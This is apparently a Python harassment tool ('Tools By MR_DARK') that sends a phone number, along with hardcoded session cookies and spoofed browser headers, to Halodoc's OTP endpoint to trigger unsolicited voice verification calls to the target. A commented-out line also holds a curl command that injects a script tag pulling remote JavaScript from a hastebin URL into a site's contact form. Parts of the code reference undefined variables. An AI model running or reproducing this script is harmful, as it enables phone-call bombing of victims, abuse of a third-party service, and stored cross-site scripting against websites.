import os,sys,requests,json,base64
from requests import post
nomor = sys.argv[1]
try:
	cookies = {
	    'XSRF-TOKEN': '81CA33CAB330A40985C16E43DE47293A19EF4F48E18C8884471938611B9D0FCCE0E5FDB25137251A17156E0ABADDFD7973B1',
	    '_gcl_au': '1.1.1880628522.1661938103',
	    '_ga': 'GA1.2.1389857486.1661938103',
	    '_gid': 'GA1.2.3091171.1661938103',
	    '_gat_UA-89605346-3': '1',
	    'ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7': '%7B%22g%22%3A%2227035447-76b4-d81a-c143-8721ada07a34%22%2C%22c%22%3A1661938102956%2C%22l%22%3A1661938102956%7D',
	    'afUserId': '65b6227b-fbf4-440c-9690-bac120b54937-p',
	    'AF_SYNC': '1661938104902',
	    'amp_394863': 'kRB7FYsUq_slx_HNFIxN2_...1gbpjlsmp.1gbpjm8n4.3.1.4',
	    'ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7': '%7B%22g%22%3A%22ad78159f-09c5-6579-5860-79f95caf201a%22%2C%22e%22%3A1661939915314%2C%22c%22%3A1661938102950%2C%22l%22%3A1661938115314%7D',
	}

	headers = {
	    'authority': 'www.halodoc.com',
	    'accept': 'application/json, text/plain, */*',
	    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
	    # Already added when you pass json=
	    # 'content-type': 'application/json',
	    # Requests sorts cookies= alphabetically
	    # 'cookie': 'XSRF-TOKEN=81CA33CAB330A40985C16E43DE47293A19EF4F48E18C8884471938611B9D0FCCE0E5FDB25137251A17156E0ABADDFD7973B1; _gcl_au=1.1.1880628522.1661938103; _ga=GA1.2.1389857486.1661938103; _gid=GA1.2.3091171.1661938103; _gat_UA-89605346-3=1; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2227035447-76b4-d81a-c143-8721ada07a34%22%2C%22c%22%3A1661938102956%2C%22l%22%3A1661938102956%7D; afUserId=65b6227b-fbf4-440c-9690-bac120b54937-p; AF_SYNC=1661938104902; amp_394863=kRB7FYsUq_slx_HNFIxN2_...1gbpjlsmp.1gbpjm8n4.3.1.4; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22ad78159f-09c5-6579-5860-79f95caf201a%22%2C%22e%22%3A1661939915314%2C%22c%22%3A1661938102950%2C%22l%22%3A1661938115314%7D',
	    'origin': 'https://www.halodoc.com',
	    'sec-ch-ua': '"Chromium";v="105", "Not)A;Brand";v="8"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 12; RMX3363) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
	    'x-xsrf-token': '81CA33CAB330A40985C16E43DE47293A19EF4F48E18C8884471938611B9D0FCCE0E5FDB25137251A17156E0ABADDFD7973B1',
	}

	json_data = {
	    'phone_number': '+62'+nomor,
	    'channel': 'voice',
	}

	response = requests.post('https://www.halodoc.com/api/v1/users/authentication/otp/requests', cookies=cookies, headers=headers, json=json_data).text
	if "new_user" in response:
	     print ("[»] *Tools By MR_DARK*")
	     print (f"*[»]* *Calling* *+62{nomor}* *Success* :)")
	     print (f"*Message:* Success")
	else:
	     print ("[»] *Tools By MR_DARK*")
	     print (f"*[»]* *Calling* *+62{nomor}* *gagal* :(")
	     print (f"*Message:* {responses}")
	     #os.system(f"curl --url {tar} --data 'nama=admin&email=admin%40gmail.com&pesan=%3Cscript+type%3D%22text%2Fjavascript%22+src%3D%22https%3A%2F%2Fhastebin.com%2Fraw%2Fudoxideleh%22%3E%3C%2Fscript%3E&submit=Kirim+Pesan'")
except:
	print ("wh00pz")